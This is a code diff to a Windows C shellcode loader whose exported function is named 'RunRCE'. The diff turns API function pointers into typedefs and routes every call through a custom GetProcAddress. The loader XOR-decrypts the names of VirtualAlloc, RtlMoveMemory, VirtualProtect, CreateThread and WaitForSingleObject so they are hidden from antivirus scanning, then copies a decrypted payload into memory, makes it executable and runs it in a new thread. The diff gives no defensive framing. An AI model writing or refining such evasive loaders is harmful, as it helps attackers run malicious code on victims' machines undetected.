@@ -53,7 +53,7 @@ struct LDR_MODULE {
 
 // LPVOID (WINAPI * ppVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
 
-typedef PVOID(WINAPI *pVirtualAlloc)(
+typedef PVOID (WINAPI *pVirtualAlloc)(
   LPVOID lpAddress,
   SIZE_T dwSize,
   DWORD  flAllocationType,
@@ -61,20 +61,38 @@ typedef PVOID(WINAPI *pVirtualAlloc)(
 );
 
 
-BOOL (WINAPI * pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
-HANDLE (WINAPI * pCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
-DWORD (WINAPI * pWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
-VOID (WINAPI * pRtlMoveMemory)(
+typedef BOOL (WINAPI * pVirtualProtect)(
+  LPVOID lpAddress,
+  SIZE_T dwSize,
+  DWORD flNewProtect,
+  PDWORD lpflOldProtect
+);
+
+typedef HANDLE (WINAPI * pCreateThread)(
+  LPSECURITY_ATTRIBUTES lpThreadAttributes,
+  SIZE_T dwStackSize,
+  LPTHREAD_START_ROUTINE lpStartAddress,
+  __drv_aliasesMem LPVOID lpParameter,
+  DWORD dwCreationFlags,
+  LPDWORD lpThreadId
+);
+
+typedef DWORD (WINAPI * pWaitForSingleObject)(
+  HANDLE hHandle,
+  DWORD dwMilliseconds
+);
+
+typedef VOID (WINAPI * pRtlMoveMemory)(
   _Out_       VOID UNALIGNED *Destination,
   _In_  const VOID UNALIGNED *Source,
   _In_        SIZE_T         Length
 );
 
-typedef HMODULE(WINAPI *pGetModuleHandleA)(
+typedef HMODULE (WINAPI *pGetModuleHandleA)(
   LPCSTR lpModuleName
 );
 
-typedef FARPROC(WINAPI *pGetProcAddress)(
+typedef FARPROC (WINAPI *pGetProcAddress)(
   HMODULE hModule,
   LPCSTR  lpProcName
 );
@@ -179,12 +197,9 @@ __declspec(dllexport) BOOL WINAPI RunRCE(void) {
 
   // decrypt VirtualAlloc
   XOR((char *) s_va, s_va_len, s_va_key, sizeof(s_va_key));
-  // ppVirtualAlloc = GetProcAddress(GetModuleHandle("kernel32.dll"), s_va);
   pVirtualAlloc myVirtualAlloc = (pVirtualAlloc)myGetProcAddress(hk32, s_va);
-  // printf("%d\n", myGetProcAddress(hk32, s_va));
 
   // allocate memory for payload
-  // exec_mem = ppVirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
   exec_mem = myVirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
   // decrypt payload
@@ -192,26 +207,26 @@ __declspec(dllexport) BOOL WINAPI RunRCE(void) {
 
   // copy payload to allocated buffer
   XOR((char *) s_rmm, s_rmm_len, s_rmm_key, sizeof(s_rmm_key));
-  pRtlMoveMemory = GetProcAddress(GetModuleHandle("kernel32.dll"), s_rmm);
-  pRtlMoveMemory(exec_mem, my_payload, my_payload_len);
+  pRtlMoveMemory myRtlMoveMemory = (pRtlMoveMemory)myGetProcAddress(hk32, s_rmm);
+  myRtlMoveMemory(exec_mem, my_payload, my_payload_len);
 
   // decrypt VirtualProtect
   XOR((char *) s_vp, s_vp_len, s_vp_key, sizeof(s_vp_key));
-  pVirtualProtect = GetProcAddress(GetModuleHandle("kernel32.dll"), s_vp);
-  rv = pVirtualProtect(exec_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect);
+  pVirtualProtect myVirtualProtect = (pVirtualProtect)myGetProcAddress(hk32, s_vp);
+  rv = myVirtualProtect(exec_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect);
 
   // if all good, launch the payload
   if ( rv != 0 ) {
 
       // decrypt CreateThread
       XOR((char *) s_ct, s_ct_len, s_ct_key, sizeof(s_ct_key));
-      pCreateThread = GetProcAddress(GetModuleHandle("kernel32.dll"), s_ct);
-      th = pCreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
+      pCreateThread myCreateThread = (pCreateThread)myGetProcAddress(hk32, s_ct);
+      th = myCreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
 
       // decrypt WaitForSingleObject
       XOR((char *) s_wfso, s_wfso_len, s_wfso_key, sizeof(s_wfso_key));
-      pWaitForSingleObject = GetProcAddress(GetModuleHandle("kernel32.dll"), s_wfso);
-      pWaitForSingleObject(th, -1);
+      pWaitForSingleObject myWaitForSingleObject = (pWaitForSingleObject)myGetProcAddress(hk32, s_wfso);
+      myWaitForSingleObject(th, -1);
   }
   return TRUE;
   }
